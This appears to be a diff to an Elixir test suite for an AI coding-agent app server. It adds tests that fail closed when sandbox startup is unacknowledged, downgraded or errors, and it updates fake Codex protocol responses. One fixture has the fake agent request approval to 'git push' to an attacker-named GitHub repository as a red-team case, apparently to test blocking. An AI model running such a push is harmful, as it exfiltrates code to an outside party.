@@ -1,13 +1,6 @@
 defmodule SymphonyElixir.AppServerTest do
   use SymphonyElixir.TestSupport
 
-  defmodule AlwaysErrorAudit do
-    @moduledoc false
-    def audit(_workspace, _opts), do: {:error, {:git_failed, ["rev-parse"], "boom"}}
-    defdelegate git_pr_create_command?(command), to: SymphonyElixir.DependencyAudit
-    defdelegate approval_metadata(items), to: SymphonyElixir.DependencyAudit
-  end
-
   test "app server rejects the workspace root and paths outside workspace root" do
     test_root =
       Path.join(
@@ -148,7 +141,7 @@ defmodule SymphonyElixir.AppServerTest do
             printf '%s\\n' '{"id":2,"result":{"thread":{"id":"thread-1001"}}}'
             ;;
           3)
-            printf '%s\\n' '{"id":3,"result":{"turn":{"id":"turn-1001"}}}'
+            printf '%s\\n' '{"id":3,"result":{"turn":{"id":"turn-1001","status":"inProgress","items":[]}}}'
             ;;
           4)
             printf '%s\\n' '{"method":"turn/completed"}'
@@ -427,6 +420,267 @@ defmodule SymphonyElixir.AppServerTest do
     end
   end
 
+  test "app server fails closed when sandbox startup is not acknowledged before turn completion" do
+    test_root =
+      Path.join(
+        System.tmp_dir!(),
+        "symphony-elixir-app-server-sandbox-missing-ack-#{System.unique_integer([:positive])}"
+      )
+
+    try do
+      workspace_root = Path.join(test_root, "workspaces")
+      workspace = Path.join(workspace_root, "MT-SANDBOX-MISSING")
+      codex_binary = Path.join(test_root, "fake-codex")
+      File.mkdir_p!(workspace)
+
+      File.write!(codex_binary, """
+      #!/bin/sh
+      count=0
+
+      while IFS= read -r _line; do
+        count=$((count + 1))
+
+        case "$count" in
+          1)
+            printf '%s\\n' '{"id":1,"result":{}}'
+            ;;
+          2)
+            printf '%s\\n' '{"id":2,"result":{"thread":{"id":"thread-sandbox-missing"}}}'
+            ;;
+          3)
+            printf '%s\\n' '{"id":3,"result":{"turn":{"id":"turn-sandbox-missing"}}}'
+            ;;
+          4)
+            printf '%s\\n' '{"method":"turn/completed"}'
+            exit 0
+            ;;
+          *)
+            exit 0
+            ;;
+        esac
+      done
+      """)
+
+      File.chmod!(codex_binary, 0o755)
+
+      write_workflow_file!(Workflow.workflow_file_path(),
+        workspace_root: workspace_root,
+        agent_command: "#{codex_binary} app-server"
+      )
+
+      issue = %Issue{
+        id: "issue-sandbox-missing",
+        identifier: "MT-SANDBOX-MISSING",
+        title: "Require sandbox startup acknowledgement",
+        description: "Ensure a missing sandbox startup acknowledgement fails closed",
+        state: "In Progress",
+        url: "https://example.org/issues/MT-SANDBOX-MISSING",
+        labels: ["backend"]
+      }
+
+      assert {:error, :sandbox_required} =
+               AppServer.run(workspace, "Validate missing sandbox acknowledgement", issue)
+    after
+      File.rm_rf(test_root)
+    end
+  end
+
+  test "app server fails closed when sandbox startup is downgraded or unavailable" do
+    test_root =
+      Path.join(
+        System.tmp_dir!(),
+        "symphony-elixir-app-server-sandbox-downgraded-#{System.unique_integer([:positive])}"
+      )
+
+    try do
+      workspace_root = Path.join(test_root, "workspaces")
+      workspace = Path.join(workspace_root, "MT-SANDBOX-DOWN")
+      codex_binary = Path.join(test_root, "fake-codex")
+      File.mkdir_p!(workspace)
+
+      File.write!(codex_binary, """
+      #!/bin/sh
+      count=0
+
+      while IFS= read -r _line; do
+        count=$((count + 1))
+
+        case "$count" in
+          1)
+            printf '%s\\n' '{"id":1,"result":{}}'
+            ;;
+          2)
+            printf '%s\\n' '{"id":2,"result":{"thread":{"id":"thread-sandbox-down"}}}'
+            ;;
+          3)
+            printf '%s\\n' '{"id":3,"result":{"turn":{"id":"turn-sandbox-down","status":"inProgress","items":[]}}}'
+            ;;
+          4)
+            printf '%s\\n' '{"method":"sandbox/downgraded","params":{"reason":"sandbox runtime unavailable"}}'
+            sleep 1
+            ;;
+          *)
+            sleep 1
+            ;;
+        esac
+      done
+      """)
+
+      File.chmod!(codex_binary, 0o755)
+
+      write_workflow_file!(Workflow.workflow_file_path(),
+        workspace_root: workspace_root,
+        agent_command: "#{codex_binary} app-server"
+      )
+
+      issue = %Issue{
+        id: "issue-sandbox-down",
+        identifier: "MT-SANDBOX-DOWN",
+        title: "Require sandbox availability",
+        description: "Ensure a downgraded sandbox fails closed",
+        state: "In Progress",
+        url: "https://example.org/issues/MT-SANDBOX-DOWN",
+        labels: ["backend"]
+      }
+
+      assert {:error, :sandbox_required} =
+               AppServer.run(workspace, "Validate sandbox downgraded", issue)
+    after
+      File.rm_rf(test_root)
+    end
+  end
+
+  test "app server maps current Codex sandboxError startup failures to sandbox required" do
+    test_root =
+      Path.join(
+        System.tmp_dir!(),
+        "symphony-elixir-app-server-sandbox-error-#{System.unique_integer([:positive])}"
+      )
+
+    try do
+      workspace_root = Path.join(test_root, "workspaces")
+      workspace = Path.join(workspace_root, "MT-SANDBOX-ERROR")
+      codex_binary = Path.join(test_root, "fake-codex")
+      File.mkdir_p!(workspace)
+
+      File.write!(codex_binary, """
+      #!/bin/sh
+      count=0
+
+      while IFS= read -r _line; do
+        count=$((count + 1))
+
+        case "$count" in
+          1)
+            printf '%s\\n' '{"id":1,"result":{}}'
+            ;;
+          2)
+            printf '%s\\n' '{"id":2,"result":{"thread":{"id":"thread-sandbox-error"}}}'
+            ;;
+          3)
+            printf '%s\\n' '{"id":3,"result":{"turn":{"id":"turn-sandbox-error","status":"inProgress","items":[]}}}'
+            ;;
+          4)
+            printf '%s\\n' '{"method":"error","params":{"threadId":"thread-sandbox-error","turnId":"turn-sandbox-error","willRetry":false,"error":{"message":"sandbox runtime unavailable","codexErrorInfo":"sandboxError"}}}'
+            sleep 1
+            ;;
+          *)
+            sleep 1
+            ;;
+        esac
+      done
+      """)
+
+      File.chmod!(codex_binary, 0o755)
+
+      write_workflow_file!(Workflow.workflow_file_path(),
+        workspace_root: workspace_root,
+        agent_command: "#{codex_binary} app-server"
+      )
+
+      issue = %Issue{
+        id: "issue-sandbox-error",
+        identifier: "MT-SANDBOX-ERROR",
+        title: "Require sandbox error handling",
+        description: "Ensure current Codex sandbox errors fail closed",
+        state: "In Progress",
+        url: "https://example.org/issues/MT-SANDBOX-ERROR",
+        labels: ["backend"]
+      }
+
+      assert {:error, :sandbox_required} =
+               AppServer.run(workspace, "Validate sandbox error", issue)
+    after
+      File.rm_rf(test_root)
+    end
+  end
+
+  test "app server accepts current Codex turn-started sandbox startup acknowledgement" do
+    test_root =
+      Path.join(
+        System.tmp_dir!(),
+        "symphony-elixir-app-server-sandbox-turn-started-#{System.unique_integer([:positive])}"
+      )
+
+    try do
+      workspace_root = Path.join(test_root, "workspaces")
+      workspace = Path.join(workspace_root, "MT-SANDBOX-READY")
+      codex_binary = Path.join(test_root, "fake-codex")
+      File.mkdir_p!(workspace)
+
+      File.write!(codex_binary, """
+      #!/bin/sh
+      count=0
+
+      while IFS= read -r _line; do
+        count=$((count + 1))
+
+        case "$count" in
+          1)
+            printf '%s\\n' '{"id":1,"result":{}}'
+            ;;
+          2)
+            printf '%s\\n' '{"id":2,"result":{"thread":{"id":"thread-sandbox-ready"}}}'
+            ;;
+          3)
+            printf '%s\\n' '{"id":3,"result":{"turn":{"id":"turn-sandbox-ready"}}}'
+            ;;
+          4)
+            printf '%s\\n' '{"method":"turn/started","params":{"threadId":"thread-sandbox-ready","turn":{"id":"turn-sandbox-ready","status":"inProgress","items":[]}}}'
+            printf '%s\\n' '{"method":"turn/completed","params":{"threadId":"thread-sandbox-ready","turn":{"id":"turn-sandbox-ready","status":"completed","items":[]}}}'
+            exit 0
+            ;;
+          *)
+            exit 0
+            ;;
+        esac
+      done
+      """)
+
+      File.chmod!(codex_binary, 0o755)
+
+      write_workflow_file!(Workflow.workflow_file_path(),
+        workspace_root: workspace_root,
+        agent_command: "#{codex_binary} app-server"
+      )
+
+      issue = %Issue{
+        id: "issue-sandbox-ready",
+        identifier: "MT-SANDBOX-READY",
+        title: "Accept sandbox startup acknowledgement",
+        description: "Ensure current Codex startup acknowledgement succeeds",
+        state: "In Progress",
+        url: "https://example.org/issues/MT-SANDBOX-READY",
+        labels: ["backend"]
+      }
+
+      assert {:ok, %{result: :turn_completed}} =
+               AppServer.run(workspace, "Validate sandbox ready", issue)
+    after
+      File.rm_rf(test_root)
+    end
+  end
+
   test "app server marks child processes as Symphony agent runtime" do
     test_root =
       Path.join(
@@ -459,7 +713,7 @@ defmodule SymphonyElixir.AppServerTest do
             printf '%s\\n' '{"id":2,"result":{"thread":{"id":"thread-1002"}}}'
             ;;
           3)
-            printf '%s\\n' '{"id":3,"result":{"turn":{"id":"turn-1002"}}}'
+            printf '%s\\n' '{"id":3,"result":{"turn":{"id":"turn-1002","status":"inProgress","items":[]}}}'
             ;;
           4)
             printf '%s\\n' '{"method":"turn/completed"}'
@@ -545,7 +799,7 @@ defmodule SymphonyElixir.AppServerTest do
         case "$count" in
           1) printf '%s\\n' '{"id":1,"result":{}}' ;;
           2) printf '%s\\n' '{"id":2,"result":{"thread":{"id":"thread-env-strip"}}}' ;;
-          3) printf '%s\\n' '{"id":3,"result":{"turn":{"id":"turn-env-strip"}}}' ;;
+          3) printf '%s\\n' '{"id":3,"result":{"turn":{"id":"turn-env-strip","status":"inProgress","items":[]}}}' ;;
           4) printf '%s\\n' '{"method":"turn/completed"}'; exit 0 ;;
           *) exit 0 ;;
         esac
@@ -613,7 +867,7 @@ defmodule SymphonyElixir.AppServerTest do
             printf '%s\\n' '{"id":2,"result":{"thread":{"id":"thread-1003"}}}'
             ;;
           3)
-            printf '%s\\n' '{"id":3,"result":{"turn":{"id":"turn-1003"}}}'
+            printf '%s\\n' '{"id":3,"result":{"turn":{"id":"turn-1003","status":"inProgress","items":[]}}}'
             printf '%s\\n' '{"method":"item/started","params":{"item":{"id":"cmd-timeout","type":"commandExecution","status":"running","command":"mix run --no-halt"}}}'
             ;;
           *)
@@ -683,7 +937,7 @@ defmodule SymphonyElixir.AppServerTest do
             printf '%s\\n' '{\"id\":2,\"result\":{\"thread\":{\"id\":\"thread-88\"}}}'
             ;;
           3)
-            printf '%s\\n' '{\"id\":3,\"result\":{\"turn\":{\"id\":\"turn-88\"}}}'
+            printf '%s\\n' '{\"id\":3,\"result\":{\"turn\":{\"id\":\"turn-88\",\"status\":\"inProgress\",\"items\":[]}}}'
             ;;
           4)
             printf '%s\\n' '{\"method\":\"turn/input_required\",\"id\":\"resp-1\",\"params\":{\"requiresInput\":true,\"reason\":\"blocked\"}}'
@@ -748,7 +1002,7 @@ defmodule SymphonyElixir.AppServerTest do
             printf '%s\\n' '{"id":2,"result":{"thread":{"id":"thread-89"}}}'
             ;;
           3)
-            printf '%s\\n' '{"id":3,"result":{"turn":{"id":"turn-89"}}}'
+            printf '%s\\n' '{"id":3,"result":{"turn":{"id":"turn-89","status":"inProgress","items":[]}}}'
             printf '%s\\n' '{"id":99,"method":"item/commandExecution/requestApproval","params":{"command":"gh pr view","cwd":"/tmp","reason":"need approval"}}'
             ;;
           *)
@@ -816,7 +1070,7 @@ defmodule SymphonyElixir.AppServerTest do
             printf '%s\\n' '{\"id\":2,\"result\":{\"thread\":{\"id\":\"thread-89\"}}}'
             ;;
           4)
-            printf '%s\\n' '{\"id\":3,\"result\":{\"turn\":{\"id\":\"turn-89\"}}}'
+            printf '%s\\n' '{\"id\":3,\"result\":{\"turn\":{\"id\":\"turn-89\",\"status\":\"inProgress\",\"items\":[]}}}'
             printf '%s\\n' '{\"id\":99,\"method\":\"item/commandExecution/requestApproval\",\"params\":{\"command\":\"gh pr view\",\"cwd\":\"/tmp\",\"reason\":\"need approval\"}}'
             ;;
           5)
@@ -950,7 +1204,7 @@ defmodule SymphonyElixir.AppServerTest do
             printf '%s\\n' '{\"id\":2,\"result\":{\"thread\":{\"id\":\"thread-719\"}}}'
             ;;
           4)
-            printf '%s\\n' '{\"id\":3,\"result\":{\"turn\":{\"id\":\"turn-719\"}}}'
+            printf '%s\\n' '{\"id\":3,\"result\":{\"turn\":{\"id\":\"turn-719\",\"status\":\"inProgress\",\"items\":[]}}}'
             printf '%s\\n' '{\"id\":109,\"method\":\"item/permissions/requestApproval\",\"params\":{\"threadId\":\"thread-719\",\"turnId\":\"turn-719\",\"itemId\":\"call-719\",\"cwd\":\"/tmp\",\"reason\":\"Browser automation needs access\",\"permissions\":{\"network\":{\"enabled\":true},\"fileSystem\":{\"read\":[\"/tmp\"],\"write\":null,\"globScanMaxDepth\":2,\"entries\":[{\"access\":\"read\",\"path\":{\"type\":\"path\",\"path\":\"/tmp\"}}]}}}}'
             ;;
           5)
@@ -1047,7 +1301,7 @@ defmodule SymphonyElixir.AppServerTest do
             printf '%s\\n' '{\"id\":2,\"result\":{\"thread\":{\"id\":\"thread-717\"}}}'
             ;;
           4)
-            printf '%s\\n' '{\"id\":3,\"result\":{\"turn\":{\"id\":\"turn-717\"}}}'
+            printf '%s\\n' '{\"id\":3,\"result\":{\"turn\":{\"id\":\"turn-717\",\"status\":\"inProgress\",\"items\":[]}}}'
             printf '%s\\n' '{\"id\":110,\"method\":\"item/tool/requestUserInput\",\"params\":{\"itemId\":\"call-717\",\"questions\":[{\"header\":\"Approve app tool call?\",\"id\":\"mcp_tool_call_approval_call-717\",\"isOther\":false,\"isSecret\":false,\"options\":[{\"description\":\"Run the tool and continue.\",\"label\":\"Approve Once\"},{\"description\":\"Run the tool and remember this choice for this session.\",\"label\":\"Approve this Session\"},{\"description\":\"Decline this tool call and continue.\",\"label\":\"Deny\"},{\"description\":\"Cancel this tool call\",\"label\":\"Cancel\"}],\"question\":\"The linear MCP server wants to run the tool \\\"Save issue\\\", which may modify or delete data. Allow this action?\"}],\"threadId\":\"thread-717\",\"turnId\":\"turn-717\"}}'
             ;;
           5)
@@ -1135,7 +1389,7 @@ defmodule SymphonyElixir.AppServerTest do
             printf '%s\\n' '{"id":2,"result":{"thread":{"id":"thread-720"}}}'
             ;;
           4)
-            printf '%s\\n' '{"id":3,"result":{"turn":{"id":"turn-720"}}}'
+            printf '%s\\n' '{"id":3,"result":{"turn":{"id":"turn-720","status":"inProgress","items":[]}}}'
             printf '%s\\n' '{"id":113,"method":"mcpServer/elicitation/request","params":{"threadId":"thread-720","turnId":"turn-720","serverName":"playwright","mode":"url","_meta":null,"message":"Open browser URL","url":"http://127.0.0.1:4107/","elicitationId":"open-browser-url"}}'
             ;;
           5)
@@ -1224,7 +1478,7 @@ defmodule SymphonyElixir.AppServerTest do
             printf '%s\\n' '{"id":2,"result":{"thread":{"id":"thread-721"}}}'
             ;;
           4)
-            printf '%s\\n' '{"id":3,"result":{"turn":{"id":"turn-721"}}}'
+            printf '%s\\n' '{"id":3,"result":{"turn":{"id":"turn-721","status":"inProgress","items":[]}}}'
             printf '%s\\n' '{"id":114,"method":"mcpServer/elicitation/request","params":{"threadId":"thread-721","turnId":"turn-721","serverName":"playwright","mode":"form","_meta":null,"message":"Allow browser automation","requestedSchema":{"type":"object","properties":{"allow":{"type":"boolean","title":"Allow browser access"},"reason":{"type":"string"},"remember":{"type":"boolean","default":true}},"required":["allow","reason"]}}}'
             ;;
           5)
@@ -1312,7 +1566,7 @@ defmodule SymphonyElixir.AppServerTest do
             printf '%s\\n' '{"id":2,"result":{"thread":{"id":"thread-718"}}}'
             ;;
           4)
-            printf '%s\\n' '{"id":3,"result":{"turn":{"id":"turn-718"}}}'
+            printf '%s\\n' '{"id":3,"result":{"turn":{"id":"turn-718","status":"inProgress","items":[]}}}'
             printf '%s\\n' '{"id":111,"method":"item/tool/requestUserInput","params":{"itemId":"call-718","questions":[{"header":"Provide context","id":"freeform-718","isOther":false,"isSecret":false,"options":null,"question":"What comment should I post back to the issue?"}],"threadId":"thread-718","turnId":"turn-718"}}'
             ;;
           5)
@@ -1391,7 +1645,7 @@ defmodule SymphonyElixir.AppServerTest do
             printf '%s\\n' '{\"id\":2,\"result\":{\"thread\":{\"id\":\"thread-719\"}}}'
             ;;
           4)
-            printf '%s\\n' '{\"id\":3,\"result\":{\"turn\":{\"id\":\"turn-719\"}}}'
+            printf '%s\\n' '{\"id\":3,\"result\":{\"turn\":{\"id\":\"turn-719\",\"status\":\"inProgress\",\"items\":[]}}}'
             printf '%s\\n' '{\"id\":112,\"method\":\"item/tool/requestUserInput\",\"params\":{\"itemId\":\"call-719\",\"questions\":[{\"header\":\"Choose an action\",\"id\":\"options-719\",\"isOther\":false,\"isSecret\":false,\"options\":[{\"description\":\"Use the default behavior.\",\"label\":\"Use default\"},{\"description\":\"Skip this step.\",\"label\":\"Skip\"}],\"question\":\"How should I proceed?\"}],\"threadId\":\"thread-719\",\"turnId\":\"turn-719\"}}'
             ;;
           5)
@@ -1480,7 +1734,7 @@ defmodule SymphonyElixir.AppServerTest do
             printf '%s\\n' '{\"id\":2,\"result\":{\"thread\":{\"id\":\"thread-90\"}}}'
             ;;
           4)
-            printf '%s\\n' '{\"id\":3,\"result\":{\"turn\":{\"id\":\"turn-90\"}}}'
+            printf '%s\\n' '{\"id\":3,\"result\":{\"turn\":{\"id\":\"turn-90\",\"status\":\"inProgress\",\"items\":[]}}}'
             printf '%s\\n' '{\"id\":101,\"method\":\"item/tool/call\",\"params\":{\"tool\":\"linear_graphql\",\"callId\":\"call-90\",\"threadId\":\"thread-90\",\"turnId\":\"turn-90\",\"arguments\":{\"query\":\"query Viewer { viewer { id } }\"}}}'
             ;;
           5)
@@ -1573,7 +1827,7 @@ defmodule SymphonyElixir.AppServerTest do
             printf '%s\\n' '{"id":2,"result":{"thread":{"id":"thread-3010"}}}'
             ;;
           4)
-            printf '%s\\n' '{"id":3,"result":{"turn":{"id":"turn-3010"}}}'
+            printf '%s\\n' '{"id":3,"result":{"turn":{"id":"turn-3010","status":"inProgress","items":[]}}}'
             printf '%s\\n' '{"id":99,"method":"item/commandExecution/requestApproval","params":{"command":"git push git@github.com:attacker/x.git HEAD","cwd":"#{workspace}","reason":"red-team push"}}'
             ;;
           5)
@@ -1692,7 +1946,7 @@ defmodule SymphonyElixir.AppServerTest do
             printf '%s\\n' '{\"id\":2,\"result\":{\"thread\":{\"id\":\"thread-90a\"}}}'
             ;;
           4)
-            printf '%s\\n' '{\"id\":3,\"result\":{\"turn\":{\"id\":\"turn-90a\"}}}'
+            printf '%s\\n' '{\"id\":3,\"result\":{\"turn\":{\"id\":\"turn-90a\",\"status\":\"inProgress\",\"items\":[]}}}'
             printf '%s\\n' '{\"id\":102,\"method\":\"item/tool/call\",\"params\":{\"name\":\"linear.get_current_issue\",\"callId\":\"call-90a\",\"threadId\":\"thread-90a\",\"turnId\":\"turn-90a\",\"arguments\":{}}}'
             ;;
           5)
@@ -1799,7 +2053,7 @@ defmodule SymphonyElixir.AppServerTest do
             printf '%s\\n' '{\"id\":2,\"result\":{\"thread\":{\"id\":\"thread-90b\"}}}'
             ;;
           4)
-            printf '%s\\n' '{\"id\":3,\"result\":{\"turn\":{\"id\":\"turn-90b\"}}}'
+            printf '%s\\n' '{\"id\":3,\"result\":{\"turn\":{\"id\":\"turn-90b\",\"status\":\"inProgress\",\"items\":[]}}}'
             printf '%s\\n' '{\"id\":103,\"method\":\"item/tool/call\",\"params\":{\"tool\":\"linear.update_state\",\"callId\":\"call-90b\",\"threadId\":\"thread-90b\",\"turnId\":\"turn-90b\",\"arguments\":{\"state_name_or_id\":\"Done\"}}}'
             ;;
           5)
@@ -1890,7 +2144,7 @@ defmodule SymphonyElixir.AppServerTest do
             printf '%s\\n' '{"id":2,"result":{"thread":{"id":"thread-91"}}}'
             ;;
           3)
-            printf '%s\\n' '{"id":3,"result":{"turn":{"id":"turn-91"}}}'
+            printf '%s\\n' '{"id":3,"result":{"turn":{"id":"turn-91","status":"inProgress","items":[]}}}'
             ;;
           4)
             printf '%s\\n' '{"method":"turn/completed"}'
@@ -1953,7 +2207,7 @@ defmodule SymphonyElixir.AppServerTest do
             printf '%s\\n' '{"id":2,"result":{"thread":{"id":"thread-92"}}}'
             ;;
           3)
-            printf '%s\\n' '{"id":3,"result":{"turn":{"id":"turn-92"}}}'
+            printf '%s\\n' '{"id":3,"result":{"turn":{"id":"turn-92","status":"inProgress","items":[]}}}'
             ;;
           4)
             printf '%s\\n' 'warning: this is stderr noise' >&2
@@ -2028,7 +2282,7 @@ defmodule SymphonyElixir.AppServerTest do
             printf '%s\\n' '{"id":2,"result":{"thread":{"id":"thread-93"}}}'
             ;;
           3)
-            printf '%s\\n' '{"id":3,"result":{"turn":{"id":"turn-93"}}}'
+            printf '%s\\n' '{"id":3,"result":{"turn":{"id":"turn-93","status":"inProgress","items":[]}}}'
             ;;
           4)
             printf '%s\\n' '{"method":"turn/completed"'
@@ -2108,7 +2362,7 @@ defmodule SymphonyElixir.AppServerTest do
             printf '%s\\n' '{"id":2,"result":{"thread":{"id":"thread-remote"}}}'
             ;;
           3)
-            printf '%s\\n' '{"id":3,"result":{"turn":{"id":"turn-remote"}}}'
+            printf '%s\\n' '{"id":3,"result":{"turn":{"id":"turn-remote","status":"inProgress","items":[]}}}'
             ;;
           4)
             printf '%s\\n' '{"method":"turn/completed"}'
